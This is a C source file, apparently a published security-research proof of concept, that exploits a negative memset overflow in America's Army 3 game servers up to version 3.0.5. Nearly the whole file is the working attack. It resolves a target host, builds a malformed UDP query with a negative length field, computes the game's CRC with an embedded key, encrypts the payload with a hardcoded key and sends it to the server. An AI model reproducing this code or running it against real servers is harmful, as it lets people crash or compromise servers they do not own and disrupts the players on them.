/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "leverage_ssc.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
    #define mssleep sleep
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define mssleep(X) sleep(X * 1000)
#endif



#define VER         "0.1"
#define PORT        39300
#define BUFFSZ      0xffff

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



u16 aa3_query_crc(u8 *data, int datalen);
int putcc(u8 *data, int chr, int len);
int putmm(u8 *data, u8 *str, int len);
int putss(u8 *data, u8 *str);
int putxx(u8 *data, u32 num, int bits);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            off     = 14;
    u16     port    = PORT;
    u8      *buff,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    fputs("\n"
        "America's Army 3 <= 3.0.5 negative memset overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]>\n"
            "\n"
            "note: LAN servers use port 9002\n"
            "\n", argv[0], port);
        exit(1);
    }

    host   = argv[1];
    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- send the malformed query packets\n");

    p = buff + off;  // data (useless for this test)
    p += putxx(p, 10,       16);
    p += putmm(p, "playerName", 10);
    p += putxx(p, 6,        8);
    p += putxx(p, 10,       16);
    p += putmm(p, "(unknown)", 10);
    len = p - buff;

    p = buff;       // header
    p += putxx(p, 0x354a,   16);
    p += putxx(p, aa3_query_crc(p + off, len - off), 16);
    p += putxx(p, 2,        8);
    p += putxx(p, 1,        8);
    p += putxx(p, 2,        16);
    p += putxx(p, 1,        16);
    p += putxx(p, 0,        16);
    p += putxx(p, -1,       16);    // any value between 0x8000-0xffff
    if((p - buff) != off) {
        printf("\nError: check your source code\n");
        exit(1);
    }

    ssc_encrypt("c6mw4it2kg7sz5o0813d9qyufenhj", 30, buff + off, len - off);
    len = send_recv(sd, buff, len, buff, BUFFSZ, &peer, 0);

    printf("\n- check the server manually for verifying if it's vulnerable or not\n");
    close(sd);
    free(buff);
    return(0);
}



u16 aa3_query_crc(u8 *data, int datalen) {
    static const u8 mykey[] = "l26aquiwy814m05kpt37vxc9osrnf";
    u16     crc;
    int     i,
            mykeylen;
    u8      a;

    mykeylen = strlen(mykey) + 1;
    crc = 0x14fe;
    a = mykey[0] ^ data[0];
    for(i = 0; i < datalen;) {
        crc ^= a << ((i & 1) << 3);
        i++;
        a = mykey[i % mykeylen] ^ data[i] ^ data[i - 1];
    }
    return(crc);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putmm(u8 *data, u8 *str, int len) {
    memcpy(data, str, len);
    return(len);
}



int putss(u8 *data, u8 *str) {
    int     len;

    len = strlen(str);
    memcpy(data, str, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3));
    }
    return(bytes);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry,
            len;

    if(in && !out) {
        fputc('.', stdout);
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
          < 0) goto quit;
        return(0);
    }
    if(in) {
        for(retry = 2; retry; retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


